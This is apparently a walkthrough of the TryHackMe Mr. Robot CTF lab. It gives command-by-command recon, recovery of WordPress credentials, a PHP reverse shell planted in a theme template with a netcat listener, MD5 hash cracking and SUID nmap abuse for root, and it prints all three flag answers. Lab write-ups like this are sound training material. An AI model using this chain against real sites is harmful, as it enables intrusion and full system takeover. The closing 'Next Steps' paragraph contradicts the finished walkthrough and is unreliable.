# Walkthrough: Mr. Robot CTF (Part 1)

**Target Name:** Mr. Robot CTF  
**Platform:** TryHackMe  
**Difficulty:** Medium  
**Category:** Web / Enumeration / CTF  

---

## 1. Initial Access & Connectivity

To connect to the target network, establish an OpenVPN tunnel using your TryHackMe configuration file.

```bash
sudo openvpn ap-south-1-regular.ovpn
```

* **Observation:** The OpenVPN client successfully negotiates TLS 1.3 and assigns a tunnel IP address (`192.168.135.130/20`), confirming an active connection to the laboratory subnet.

---

## 2. Reconnaissance & Enumeration

### Network Scanning
Run an `nmap` scan against the target IP to discover active services and open ports:

```bash
nmap -sV -sC <TARGET_IP>
```

* **Scan Output Highlights:**
  * `22/tcp`: SSH
  * `80/tcp`: HTTP
  * `443/tcp`: HTTPS

---

### Directory Brute-Forcing
Use `gobuster` to discover hidden endpoints and directories hosted on the web server:

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
```

* **Key Endpoint Discoveries:**
  * `/admin` (Status: 301)
  * `/login` (Status: 302 -> redirects to `/wp-login.php`)
  * `/intro` (Status: 200)
  * `/license` (Status: 200)
  * `/robots.txt` (Status: 200)

---

## 3. Web Analysis & Flag 1 Capture

### Inspecting `robots.txt`
Navigating to `http://<TARGET_IP>/robots.txt` reveals sensitive file listings disallowed from standard web crawling:

```text
User-agent: *
fsocity.dic
key-1-of-3.txt
```

---

### Download & Extraction
Download both files directly using `wget`:

```bash
wget http://<TARGET_IP>/key-1-of-3.txt
wget http://<TARGET_IP>/fsocity.dic
```

1. **`fsocity.dic`:** A custom dictionary file (~6.9MB) likely containing target-specific user/password wordlists.
2. **`key-1-of-3.txt`:** Contains the first laboratory flag.

```bash
cat key-1-of-3.txt
# Output: 073403c8a58a1f80d943455fb30724b9
```

* **Flag 1:** `073403c8a58a1f80d943455fb30724b9`

---

## 4. Credential Discovery

### Inspecting `/license`
Navigating to `http://<TARGET_IP>/license` displays a web page with text content ending in an encoded string at the bottom:

```text
do you want a password or something?

ZWxsaW90OkVSMjgtMDY1Mg==
```

---

### Decoding Base64 Credentials
Using **CyberChef** (or terminal-based Base64 decoding via `echo "..." | base64 -d`), process the string using the **From Base64** recipe:

* **Input:** `ZWxsaW90OkVSMjgtMDY1Mg==`
* **Output:** `elliot:ER28-0652`

* **Extracted Credentials:**
  * **Username:** `elliot`
  * **Password:** `ER28-0652`

# Walkthrough: Mr. Robot CTF (Part 2)

**Target Name:** Mr. Robot CTF  
**Platform:** TryHackMe  
**Difficulty:** Medium  
**Category:** Web / Exploitation / Privilege Escalation / CTF  

---

## 5. Initial Access & Reverse Shell

### WordPress Authentication
Navigate to `http://<TARGET_IP>/wp-login.php` and authenticate using the credentials obtained from the `/license` endpoint:
* **Username:** `Elliot`
* **Password:** `ER28-0652`

---

### Modifying Theme Template for Code Execution
1. In the WordPress dashboard, navigate to **Appearance > Editor**.
2. Select the **Twenty Fifteen** theme and open the `404 Template` (`404.php`) file.
3. Generate a PHP reverse shell payload using **revshells.com** set to target port `443` and your VPN IP address.
4. Replace the contents of `404.php` with the custom PHP reverse shell code and click **Update File**.

---

### Catching the Reverse Shell
1. Set up a `netcat` listener on your local machine:
   ```bash
   nc -lvnp 443
   ```
2. Trigger the reverse shell by requesting the modified 404 page in a web browser:
   ```text
   http://<TARGET_IP>/404.php
   ```
3. A reverse shell connection will land on your listener as the `daemon` user.

---

## 6. Local Enumeration & Flag 2 Capture

### Upgrading the Terminal & Searching Home Directory
Stabilize the interactive shell using Python:
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Navigate to the `/home/robot` directory:
```bash
cd /home/robot
ls -la
```

**Files Discovered:**
* `key-2-of-3.txt` (Permission denied for `daemon`)
* `password.raw-md5` (Readable)

---

### Hash Cracking
Read the MD5 hash stored inside `password.raw-md5`:
```bash
cat password.raw-md5
# Output: robot:c3fcd3d76192e4007dfb496cca67e13b
```

Crack the MD5 hash using **CrackStation**:
* **Hash:** `c3fcd3d76192e4007dfb496cca67e13b`
* **Result:** `abcdefghijklmnopqrstuvwxyz`

---

### Switching to User `robot` & Reading Flag 2
Switch user to `robot` using the cracked password:
```bash
su robot
# Password: abcdefghijklmnopqrstuvwxyz
```

Read the second flag:
```bash
cat /home/robot/key-2-of-3.txt
# Output: 822c73956184f694993bede3eb39f959
```

* **Flag 2:** `822c73956184f694993bede3eb39f959`

---

## 7. Privilege Escalation to Root & Flag 3 Capture

### SUID Binary Enumeration
Search for binaries with the SUID permission bit set:
```bash
find / -perm -u=s 2>/dev/null
```

**Key Finding:**
`/usr/local/bin/nmap` is present with SUID permissions enabled.

---

### SUID Abuse via Nmap Interactive Mode
Older versions of `nmap` (v2.02 to v5.21) include an interactive mode that can spawn a root shell when run with SUID binaries (as referenced on GTFOBins):

1. Launch `nmap` in interactive mode:
   ```bash
   nmap --interactive
   ```
2. Spawn a shell from inside the `nmap>` prompt:
   ```text
   nmap> !sh
   ```
3. Verify elevated privileges:
   ```bash
   whoami
   # Output: root
   ```

---

### Reading Flag 3
Navigate to the `/root` directory and read the final flag:
```bash
cd /root
cat key-3-of-3.txt
# Output: 04787ddef27c3dee1ee161b21670b4e4
```

* **Flag 3:** `04787ddef27c3dee1ee161b21670b4e4`

---

## Summary of Captured Flags

| Flag | File Path | Value |
| :--- | :--- | :--- |
| **Flag 1** | `/key-1-of-3.txt` | `073403c8a58a1f80d943455fb30724b9` |
| **Flag 2** | `/home/robot/key-2-of-3.txt` | `822c73956184f694993bede3eb39f959` |
| **Flag 3** | `/root/key-3-of-3.txt` | `04787ddef27c3dee1ee161b21670b4e4` |

---

## Next Steps

With credentials for the `elliot` user account now recovered, the next logical step in the assessment is authenticating via the WordPress login interface at `/wp-login.php` to achieve administrative access within the CMS.
